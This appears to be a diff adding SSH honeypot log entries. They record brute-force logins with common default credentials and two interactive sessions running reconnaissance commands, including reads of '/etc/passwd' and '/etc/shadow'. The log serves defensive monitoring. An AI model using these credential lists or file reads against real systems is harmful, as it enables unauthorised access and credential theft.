+{"event": "auth_attempt", "ts": "2026-10-17T10:36:44.367826+00:00", "session_id": "3ae0b818", "src_ip": "198.51.100.77", "username": "deploy", "password": "deploy123", "accepted": true}
+{"event": "session_end", "ts": "2026-10-17T10:36:45.189572+00:00", "session_id": "3ae0b818", "src_ip": "198.51.100.77", "duration_s": 2.706, "command_count": 0, "auth_attempts": 9, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-20T01:41:42.483536+00:00", "session_id": "6f6dd1cb", "src_ip": "198.51.100.5", "src_port": 42025, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-20T01:41:42.617026+00:00", "session_id": "6f6dd1cb", "src_ip": "198.51.100.5", "username": "jenkins", "password": "jenkins", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T01:41:42.985163+00:00", "session_id": "6f6dd1cb", "src_ip": "198.51.100.5", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T01:41:43.154467+00:00", "session_id": "6f6dd1cb", "src_ip": "198.51.100.5", "username": "git", "password": "git", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T01:41:43.522900+00:00", "session_id": "6f6dd1cb", "src_ip": "198.51.100.5", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T01:41:43.920374+00:00", "session_id": "6f6dd1cb", "src_ip": "198.51.100.5", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T01:41:44.064059+00:00", "session_id": "6f6dd1cb", "src_ip": "198.51.100.5", "username": "test", "password": "test", "accepted": true}
+{"event": "session_end", "ts": "2026-10-20T01:41:45.058060+00:00", "session_id": "6f6dd1cb", "src_ip": "198.51.100.5", "duration_s": 2.575, "command_count": 0, "auth_attempts": 6, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-17T20:30:42.483536+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "src_port": 48036, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-17T20:30:42.596938+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "username": "postgres", "password": "postgres", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T20:30:42.744570+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "username": "jenkins", "password": "jenkins", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T20:30:43.068738+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "username": "user", "password": "password", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T20:30:43.244549+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T20:30:43.619044+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "username": "git", "password": "git", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T20:30:43.712920+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T20:30:43.905905+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T20:30:44.101249+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T20:30:44.417915+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "username": "admin", "password": "admin", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T20:30:44.619779+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "username": "ftpuser", "password": "ftpuser", "accepted": true}
+{"event": "session_end", "ts": "2026-10-17T20:30:45.358788+00:00", "session_id": "6bea9a64", "src_ip": "198.51.100.5", "duration_s": 2.875, "command_count": 0, "auth_attempts": 10, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-19T10:19:42.483536+00:00", "session_id": "821e8185", "src_ip": "198.51.100.77", "src_port": 58652, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-19T10:19:42.853200+00:00", "session_id": "821e8185", "src_ip": "198.51.100.77", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T10:19:42.947637+00:00", "session_id": "821e8185", "src_ip": "198.51.100.77", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T10:19:43.309783+00:00", "session_id": "821e8185", "src_ip": "198.51.100.77", "username": "jenkins", "password": "jenkins", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T10:19:43.454307+00:00", "session_id": "821e8185", "src_ip": "198.51.100.77", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T10:19:43.568042+00:00", "session_id": "821e8185", "src_ip": "198.51.100.77", "username": "oracle", "password": "oracle", "accepted": true}
+{"event": "session_end", "ts": "2026-10-19T10:19:44.199015+00:00", "session_id": "821e8185", "src_ip": "198.51.100.77", "duration_s": 1.715, "command_count": 0, "auth_attempts": 5, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-17T18:54:42.483536+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "src_port": 47652, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-17T18:54:42.871027+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T18:54:43.134821+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "username": "postgres", "password": "postgres", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T18:54:43.306607+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T18:54:43.454975+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "username": "ftpuser", "password": "ftpuser", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T18:54:43.675558+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T18:54:43.943264+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "username": "user", "password": "password", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T18:54:44.041236+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "username": "ubuntu", "password": "ubuntu", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T18:54:44.167249+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "username": "jenkins", "password": "jenkins", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T18:54:44.267896+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "username": "git", "password": "git", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T18:54:44.511155+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "username": "root", "password": "root", "accepted": true}
+{"event": "session_end", "ts": "2026-10-17T18:54:45.423829+00:00", "session_id": "e6644bb5", "src_ip": "192.0.2.200", "duration_s": 2.94, "command_count": 0, "auth_attempts": 10, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-16T18:03:42.483536+00:00", "session_id": "57b756bf", "src_ip": "198.51.100.5", "src_port": 30965, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-16T18:03:42.638805+00:00", "session_id": "57b756bf", "src_ip": "198.51.100.5", "username": "postgres", "password": "postgres", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T18:03:42.811919+00:00", "session_id": "57b756bf", "src_ip": "198.51.100.5", "username": "git", "password": "git", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T18:03:43.157923+00:00", "session_id": "57b756bf", "src_ip": "198.51.100.5", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T18:03:43.221134+00:00", "session_id": "57b756bf", "src_ip": "198.51.100.5", "username": "ftpuser", "password": "ftpuser", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T18:03:43.606284+00:00", "session_id": "57b756bf", "src_ip": "198.51.100.5", "username": "ubuntu", "password": "ubuntu", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T18:03:43.679726+00:00", "session_id": "57b756bf", "src_ip": "198.51.100.5", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T18:03:43.987428+00:00", "session_id": "57b756bf", "src_ip": "198.51.100.5", "username": "user", "password": "password", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T18:03:44.317578+00:00", "session_id": "57b756bf", "src_ip": "198.51.100.5", "username": "admin", "password": "admin", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T18:03:44.467952+00:00", "session_id": "57b756bf", "src_ip": "198.51.100.5", "username": "pi", "password": "raspberry", "accepted": true}
+{"event": "session_end", "ts": "2026-10-16T18:03:44.784432+00:00", "session_id": "57b756bf", "src_ip": "198.51.100.5", "duration_s": 2.301, "command_count": 0, "auth_attempts": 9, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-17T23:22:42.483536+00:00", "session_id": "b996cd15", "src_ip": "192.0.2.200", "src_port": 42744, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-17T23:22:42.776733+00:00", "session_id": "b996cd15", "src_ip": "192.0.2.200", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T23:22:43.156841+00:00", "session_id": "b996cd15", "src_ip": "192.0.2.200", "username": "user", "password": "password", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T23:22:43.244236+00:00", "session_id": "b996cd15", "src_ip": "192.0.2.200", "username": "admin", "password": "admin", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T23:22:43.641599+00:00", "session_id": "b996cd15", "src_ip": "192.0.2.200", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-17T23:22:43.829607+00:00", "session_id": "b996cd15", "src_ip": "192.0.2.200", "username": "root", "password": "root", "accepted": true}
+{"event": "session_end", "ts": "2026-10-17T23:22:44.391057+00:00", "session_id": "b996cd15", "src_ip": "192.0.2.200", "duration_s": 1.908, "command_count": 0, "auth_attempts": 5, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-18T18:38:42.483536+00:00", "session_id": "3921583c", "src_ip": "198.51.100.5", "src_port": 31814, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-18T18:38:42.768786+00:00", "session_id": "3921583c", "src_ip": "198.51.100.5", "username": "jenkins", "password": "jenkins", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T18:38:42.975825+00:00", "session_id": "3921583c", "src_ip": "198.51.100.5", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T18:38:43.071940+00:00", "session_id": "3921583c", "src_ip": "198.51.100.5", "username": "test", "password": "test", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T18:38:43.438247+00:00", "session_id": "3921583c", "src_ip": "198.51.100.5", "username": "postgres", "password": "postgres", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T18:38:43.787988+00:00", "session_id": "3921583c", "src_ip": "198.51.100.5", "username": "ubuntu", "password": "ubuntu", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T18:38:44.070500+00:00", "session_id": "3921583c", "src_ip": "198.51.100.5", "username": "admin", "password": "admin", "accepted": true}
+{"event": "session_end", "ts": "2026-10-18T18:38:44.314532+00:00", "session_id": "3921583c", "src_ip": "198.51.100.5", "duration_s": 1.831, "command_count": 0, "auth_attempts": 6, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-18T22:44:42.483536+00:00", "session_id": "6282f927", "src_ip": "198.51.100.77", "src_port": 53629, "client_banner": "SSH-2.0-libssh2_1.9.0"}
+{"event": "auth_attempt", "ts": "2026-10-18T22:44:42.541213+00:00", "session_id": "6282f927", "src_ip": "198.51.100.77", "username": "ubuntu", "password": "ubuntu", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T22:44:42.931590+00:00", "session_id": "6282f927", "src_ip": "198.51.100.77", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T22:44:43.003771+00:00", "session_id": "6282f927", "src_ip": "198.51.100.77", "username": "user", "password": "password", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T22:44:43.299956+00:00", "session_id": "6282f927", "src_ip": "198.51.100.77", "username": "ftpuser", "password": "ftpuser", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T22:44:43.495136+00:00", "session_id": "6282f927", "src_ip": "198.51.100.77", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T22:44:43.580147+00:00", "session_id": "6282f927", "src_ip": "198.51.100.77", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T22:44:43.700616+00:00", "session_id": "6282f927", "src_ip": "198.51.100.77", "username": "jenkins", "password": "jenkins", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-18T22:44:43.900087+00:00", "session_id": "6282f927", "src_ip": "198.51.100.77", "username": "postgres", "password": "postgres", "accepted": true}
+{"event": "session_end", "ts": "2026-10-18T22:44:44.521847+00:00", "session_id": "6282f927", "src_ip": "198.51.100.77", "duration_s": 2.038, "command_count": 0, "auth_attempts": 8, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-20T16:59:42.483536+00:00", "session_id": "e58fd3dc", "src_ip": "198.51.100.77", "src_port": 56547, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-20T16:59:42.610307+00:00", "session_id": "e58fd3dc", "src_ip": "198.51.100.77", "username": "ftpuser", "password": "ftpuser", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T16:59:42.907066+00:00", "session_id": "e58fd3dc", "src_ip": "198.51.100.77", "username": "test", "password": "test", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T16:59:42.981011+00:00", "session_id": "e58fd3dc", "src_ip": "198.51.100.77", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T16:59:43.309134+00:00", "session_id": "e58fd3dc", "src_ip": "198.51.100.77", "username": "admin", "password": "admin", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T16:59:43.360520+00:00", "session_id": "e58fd3dc", "src_ip": "198.51.100.77", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T16:59:43.756384+00:00", "session_id": "e58fd3dc", "src_ip": "198.51.100.77", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T16:59:43.821429+00:00", "session_id": "e58fd3dc", "src_ip": "198.51.100.77", "username": "jenkins", "password": "jenkins", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T16:59:43.915204+00:00", "session_id": "e58fd3dc", "src_ip": "198.51.100.77", "username": "ubuntu", "password": "ubuntu", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-20T16:59:44.031986+00:00", "session_id": "e58fd3dc", "src_ip": "198.51.100.77", "username": "user", "password": "password", "accepted": true}
+{"event": "session_end", "ts": "2026-10-20T16:59:44.171051+00:00", "session_id": "e58fd3dc", "src_ip": "198.51.100.77", "duration_s": 1.688, "command_count": 0, "auth_attempts": 9, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-19T08:27:42.483536+00:00", "session_id": "4f9748d6", "src_ip": "198.51.100.77", "src_port": 45746, "client_banner": "SSH-2.0-Go"}
+{"event": "auth_attempt", "ts": "2026-10-19T08:27:42.589936+00:00", "session_id": "4f9748d6", "src_ip": "198.51.100.77", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T08:27:42.817737+00:00", "session_id": "4f9748d6", "src_ip": "198.51.100.77", "username": "ftpuser", "password": "ftpuser", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T08:27:43.191390+00:00", "session_id": "4f9748d6", "src_ip": "198.51.100.77", "username": "user", "password": "password", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T08:27:43.513125+00:00", "session_id": "4f9748d6", "src_ip": "198.51.100.77", "username": "test", "password": "test", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T08:27:43.895879+00:00", "session_id": "4f9748d6", "src_ip": "198.51.100.77", "username": "ubuntu", "password": "ubuntu", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T08:27:44.262212+00:00", "session_id": "4f9748d6", "src_ip": "198.51.100.77", "username": "admin", "password": "admin", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T08:27:44.368075+00:00", "session_id": "4f9748d6", "src_ip": "198.51.100.77", "username": "git", "password": "git", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T08:27:44.440031+00:00", "session_id": "4f9748d6", "src_ip": "198.51.100.77", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-19T08:27:44.720609+00:00", "session_id": "4f9748d6", "src_ip": "198.51.100.77", "username": "oracle", "password": "oracle", "accepted": true}
+{"event": "session_end", "ts": "2026-10-19T08:27:45.158309+00:00", "session_id": "4f9748d6", "src_ip": "198.51.100.77", "duration_s": 2.675, "command_count": 0, "auth_attempts": 9, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-16T20:59:42.483536+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "src_port": 57436, "client_banner": "SSH-2.0-libssh-0.9.6"}
+{"event": "auth_attempt", "ts": "2026-10-16T20:59:42.716152+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "username": "root", "password": "root", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T20:59:43.051433+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "username": "deploy", "password": "deploy123", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T20:59:43.139197+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "username": "ubuntu", "password": "ubuntu", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T20:59:43.498418+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "username": "postgres", "password": "postgres", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T20:59:43.651446+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "username": "test", "password": "test", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T20:59:43.947486+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "username": "git", "password": "git", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T20:59:44.041923+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "username": "jenkins", "password": "jenkins", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T20:59:44.354462+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "username": "oracle", "password": "oracle", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T20:59:44.572974+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "username": "pi", "password": "raspberry", "accepted": false}
+{"event": "auth_attempt", "ts": "2026-10-16T20:59:44.839301+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "username": "ftpuser", "password": "ftpuser", "accepted": true}
+{"event": "session_end", "ts": "2026-10-16T20:59:45.508276+00:00", "session_id": "73af1f36", "src_ip": "198.51.100.5", "duration_s": 3.025, "command_count": 0, "auth_attempts": 10, "reason": "no_shell_request"}
+{"event": "session_start", "ts": "2026-10-17T19:02:42.483536+00:00", "session_id": "38ece252", "src_ip": "203.0.113.101", "src_port": 34808, "client_banner": "SSH-2.0-Go"}
+{"event": "session_end", "ts": "2026-10-17T19:02:42.928231+00:00", "session_id": "38ece252", "src_ip": "203.0.113.101", "duration_s": 0.445, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-16T13:14:42.483536+00:00", "session_id": "1bcc757b", "src_ip": "203.0.113.101", "src_port": 43720, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "session_end", "ts": "2026-10-16T13:14:43.059040+00:00", "session_id": "1bcc757b", "src_ip": "203.0.113.101", "duration_s": 0.576, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-17T20:53:42.483536+00:00", "session_id": "45e4e53b", "src_ip": "192.0.2.31", "src_port": 31783, "client_banner": "SSH-2.0-Go"}
+{"event": "session_end", "ts": "2026-10-17T20:53:42.804676+00:00", "session_id": "45e4e53b", "src_ip": "192.0.2.31", "duration_s": 0.321, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-17T16:15:42.483536+00:00", "session_id": "1f1b2164", "src_ip": "203.0.113.150", "src_port": 62587, "client_banner": "SSH-2.0-Go"}
+{"event": "session_end", "ts": "2026-10-17T16:15:43.306129+00:00", "session_id": "1f1b2164", "src_ip": "203.0.113.150", "duration_s": 0.823, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-20T14:31:42.483536+00:00", "session_id": "526824d6", "src_ip": "203.0.113.150", "src_port": 46927, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "session_end", "ts": "2026-10-20T14:31:43.089582+00:00", "session_id": "526824d6", "src_ip": "203.0.113.150", "duration_s": 0.606, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-16T19:45:42.483536+00:00", "session_id": "c47694bd", "src_ip": "203.0.113.150", "src_port": 34852, "client_banner": "SSH-2.0-Go"}
+{"event": "session_end", "ts": "2026-10-16T19:45:42.980581+00:00", "session_id": "c47694bd", "src_ip": "203.0.113.150", "duration_s": 0.497, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-17T23:19:42.483536+00:00", "session_id": "9a72d36f", "src_ip": "192.0.2.31", "src_port": 37380, "client_banner": "SSH-2.0-Go"}
+{"event": "session_end", "ts": "2026-10-17T23:19:42.847406+00:00", "session_id": "9a72d36f", "src_ip": "192.0.2.31", "duration_s": 0.364, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-15T23:19:42.483536+00:00", "session_id": "8fcab45d", "src_ip": "203.0.113.150", "src_port": 54468, "client_banner": "SSH-2.0-Go"}
+{"event": "session_end", "ts": "2026-10-15T23:19:43.450638+00:00", "session_id": "8fcab45d", "src_ip": "203.0.113.150", "duration_s": 0.967, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-20T05:54:42.483536+00:00", "session_id": "16f4e6c6", "src_ip": "203.0.113.150", "src_port": 45845, "client_banner": "SSH-2.0-Go"}
+{"event": "session_end", "ts": "2026-10-20T05:54:42.846111+00:00", "session_id": "16f4e6c6", "src_ip": "203.0.113.150", "duration_s": 0.363, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-17T01:05:42.483536+00:00", "session_id": "87ef5ade", "src_ip": "192.0.2.31", "src_port": 47612, "client_banner": "SSH-2.0-Go"}
+{"event": "session_end", "ts": "2026-10-17T01:05:42.877401+00:00", "session_id": "87ef5ade", "src_ip": "192.0.2.31", "duration_s": 0.394, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-16T08:10:42.483536+00:00", "session_id": "e26b2b31", "src_ip": "203.0.113.101", "src_port": 53179, "client_banner": "SSH-2.0-Go"}
+{"event": "session_end", "ts": "2026-10-16T08:10:42.837116+00:00", "session_id": "e26b2b31", "src_ip": "203.0.113.101", "duration_s": 0.354, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-19T05:46:42.483536+00:00", "session_id": "afa20f12", "src_ip": "192.0.2.31", "src_port": 53218, "client_banner": "SSH-2.0-libssh2_1.10.0"}
+{"event": "session_end", "ts": "2026-10-19T05:46:43.253003+00:00", "session_id": "afa20f12", "src_ip": "192.0.2.31", "duration_s": 0.769, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-17T23:18:42.483536+00:00", "session_id": "5b7c7ef2", "src_ip": "192.0.2.31", "src_port": 39472, "client_banner": "SSH-2.0-Go"}
+{"event": "session_end", "ts": "2026-10-17T23:18:43.262548+00:00", "session_id": "5b7c7ef2", "src_ip": "192.0.2.31", "duration_s": 0.779, "command_count": 0, "auth_attempts": 0, "reason": "no_channel"}
+{"event": "session_start", "ts": "2026-10-22T00:16:42.483536+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "src_port": 51235, "client_banner": "SSH-2.0-PuTTY_Release_0.78"}
+{"event": "auth_attempt", "ts": "2026-10-22T00:16:42.864437+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "username": "root", "password": "root", "accepted": true}
+{"event": "command", "ts": "2026-10-22T00:16:50.617167+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "whoami", "seconds_since_prev": 0.0, "backspaces": 5}
+{"event": "command", "ts": "2026-10-22T00:17:03.680658+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "id", "seconds_since_prev": 13.0635, "backspaces": 3}
+{"event": "command", "ts": "2026-10-22T00:17:11.140855+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "uname -a", "seconds_since_prev": 7.4602, "backspaces": 3}
+{"event": "command", "ts": "2026-10-22T00:17:16.259741+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "ls -la", "seconds_since_prev": 5.1189, "backspaces": 0}
+{"event": "command", "ts": "2026-10-22T00:17:18.643782+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "cat /etc/passwd", "seconds_since_prev": 2.384, "backspaces": 5}
+{"event": "command", "ts": "2026-10-22T00:17:29.078521+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "ps", "seconds_since_prev": 10.4347, "backspaces": 5}
+{"event": "command", "ts": "2026-10-22T00:17:36.136153+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "df -h", "seconds_since_prev": 7.0576, "backspaces": 2}
+{"event": "command", "ts": "2026-10-22T00:17:47.253297+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "cat /root/notes.txt", "seconds_since_prev": 11.1171, "backspaces": 5}
+{"event": "command", "ts": "2026-10-22T00:17:52.723112+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "ls /home/deploy", "seconds_since_prev": 5.4698, "backspaces": 0}
+{"event": "command", "ts": "2026-10-22T00:17:58.410140+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "cat /etc/shadow", "seconds_since_prev": 5.687, "backspaces": 2}
+{"event": "command", "ts": "2026-10-22T00:18:11.426924+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "netstat -tulpn", "seconds_since_prev": 13.0168, "backspaces": 5}
+{"event": "command", "ts": "2026-10-22T00:18:14.935729+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "command": "exit", "seconds_since_prev": 3.5088, "backspaces": 1}
+{"event": "session_end", "ts": "2026-10-22T00:18:15.527190+00:00", "session_id": "285aad78", "src_ip": "203.0.113.77", "duration_s": 93.044, "command_count": 12, "auth_attempts": 1, "reason": "closed"}
+{"event": "session_start", "ts": "2026-10-19T23:43:42.483536+00:00", "session_id": "8e18efe6", "src_ip": "198.51.100.42", "src_port": 55983, "client_banner": "SSH-2.0-PuTTY_Release_0.78"}
+{"event": "auth_attempt", "ts": "2026-10-19T23:43:42.717453+00:00", "session_id": "8e18efe6", "src_ip": "198.51.100.42", "username": "root", "password": "P@ssw0rd", "accepted": true}
+{"event": "command", "ts": "2026-10-19T23:43:52.703575+00:00", "session_id": "8e18efe6", "src_ip": "198.51.100.42", "command": "whoami", "seconds_since_prev": 0.0, "backspaces": 0}
+{"event": "command", "ts": "2026-10-19T23:43:57.345426+00:00", "session_id": "8e18efe6", "src_ip": "198.51.100.42", "command": "id", "seconds_since_prev": 4.6419, "backspaces": 2}
+{"event": "command", "ts": "2026-10-19T23:44:09.909234+00:00", "session_id": "8e18efe6", "src_ip": "198.51.100.42", "command": "uname -a", "seconds_since_prev": 12.5638, "backspaces": 5}
+{"event": "command", "ts": "2026-10-19T23:44:15.941345+00:00", "session_id": "8e18efe6", "src_ip": "198.51.100.42", "command": "ls -la", "seconds_since_prev": 6.0321, "backspaces": 2}
+{"event": "command", "ts": "2026-10-19T23:44:18.637187+00:00", "session_id": "8e18efe6", "src_ip": "198.51.100.42", "command": "cat /etc/passwd", "seconds_since_prev": 2.6958, "backspaces": 2}
+{"event": "command", "ts": "2026-10-19T23:44:23.088012+00:00", "session_id": "8e18efe6", "src_ip": "198.51.100.42", "command": "ps", "seconds_since_prev": 4.4508, "backspaces": 1}
